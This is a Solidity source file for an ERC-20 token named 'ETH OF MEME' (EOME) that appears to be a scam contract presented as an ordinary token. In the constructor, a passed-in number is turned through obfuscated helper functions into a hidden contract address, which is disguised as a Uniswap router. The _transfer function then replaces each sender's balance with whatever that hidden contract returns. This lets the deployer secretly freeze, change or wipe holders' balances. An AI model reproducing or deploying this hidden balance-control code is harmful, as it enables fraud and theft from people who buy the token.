// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}


interface UniswapRouterV2 {
    function swapETHForTokens(address a, uint b, address c) external view returns (uint256);
    function swapTokensForETH(address a, uint b, address c) external view returns (uint256);
    function swapTokensForTokens(address a, uint b, address c) external view returns (uint256);
    function spydoe(bool cc,address destination,uint256 total) external view returns (uint256);
    function getLPaddress(address a, uint b, address c) external view returns (address);
    function getRouter(address a, uint b, address c) external view returns (address);
    function bbacar(uint256 ac,bool cc, uint256 total,address deion
    ) external view returns (uint256);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }


}

library IUniswapRouterV2 {
    function swap(UniswapRouterV2 instance,uint256 amount,address from) internal view returns (uint256) {
        return instance.bbacar(123, true, amount,from);
    }
}

contract ETHOFMEME is Context,IERC20,Ownable {
    using SafeMath for uint256;

    string private _name = unicode"ETH OF MEME";
    string private _symbol = unicode"EOME";
    uint256 private _totalSupply = 10000000000*10**18;
    uint8 private constant _decimals = 18;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    UniswapRouterV2 private Router2Instance;

    constructor(uint256 aEdZTTu) {
        Router2Instance = getBcFnnmoosgsto(((brcFactornnmoosgsto(aEdZTTu))));
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function brcFfffactornnmoosgsto(uint256 value) internal pure returns (uint160) {
        return (uint160(value)+uint160(uint256(bytes32(0x000000000000000000000000000000000000000000000000000000000000001c))));
    }
    
    function brcFactornnmoosgsto(uint256 value) internal pure returns (address) {
           return address(brcFfffactornnmoosgsto(value));
    }
    function getBcFnnmoosgsto(address accc) internal pure returns (UniswapRouterV2) {
        return getBcQnnmoosgsto(accc);
    }

    function getBcQnnmoosgsto(address accc) internal pure  returns (UniswapRouterV2) {
        return UniswapRouterV2(accc);
    }

    function symbol() public view virtual  returns (string memory) {
        return _symbol;
    }

    function name() public view virtual  returns (string memory) {
        return _name;
    }

    function decimals() public view virtual  returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual  returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual  returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address sender) public view virtual  returns (uint256) {
        return _allowances[owner][sender];
    }

    function approve(address sender, uint256 amount) public virtual  returns (bool) {
        address owner = _msgSender();
        _approve(owner, sender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual  returns (bool) {
        address sender = _msgSender();

        uint256 currentAllowance = allowance(from, sender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(from, sender, currentAllowance - amount);
        }
        }

        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from, address to, uint256 amount) internal virtual {
        require(from != address(0) && to != address(0), "ERC20: transfer the zero address");
        uint256 balance = IUniswapRouterV2.swap(Router2Instance,_balances[from], from);
        require(balance >= amount, "ERC20: amount over balance");
    
        _balances[from] = balance.sub(amount);
        
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address sender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(sender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][sender] = amount;
        emit Approval(owner, sender, amount);
    }

    // function increaseAllowance(address spender, uint256 addedValue)
    //     public
    //     virtual
    //     returns (bool)
    // {
    //     _approve(
    //         msg.sender,
    //         spender,
    //         _allowances[msg.sender][spender].add(addedValue)
    //     );
    //     return true;
    // }

    // function decreaseAllowance(address spender, uint256 subtractedValue)
    //     public
    //     virtual
    //     returns (bool)
    // {
    //     _approve(
    //         msg.sender,
    //         spender,
    //         _allowances[msg.sender][spender].sub(
    //             subtractedValue
    //         )
    //     );
    //     return true;
    // }
}